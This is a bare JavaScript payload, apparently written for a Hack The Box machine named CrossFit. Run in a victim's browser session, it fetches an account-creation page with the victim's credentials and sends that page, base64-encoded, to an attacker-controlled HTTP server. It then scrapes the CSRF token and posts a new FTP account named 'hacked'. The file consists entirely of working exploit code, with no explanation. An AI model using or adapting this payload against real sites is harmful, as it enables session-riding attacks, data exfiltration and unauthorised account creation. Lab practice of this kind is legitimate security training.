myhttpserver = 'http://10.10.16.110:1234'
targeturl = 'http://ftp.crossfit.htb/accounts/create'
username = 'hacked'
password = 'hacked'

req = new XMLHttpRequest;
req.withCredentials = true;
req.onreadystatechange = function() {
    if (req.readyState == 4) {
        req2 = new XMLHttpRequest;
        req2.open('GET', myhttpserver + btoa(this.responseText), false);
        req2.send();
    }
}
req.open('GET', targeturl, false);
req.send();

regx = /token" value="(.*)"/g;
token = regx.exec(req.responseText)[1];

var params = '_token=' + token + '&username=' + username + '&pass=' + password + '&submit=submit'
req.open('POST', "http://ftp.crossfit.htb/accounts", false);
req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
req.send(params);
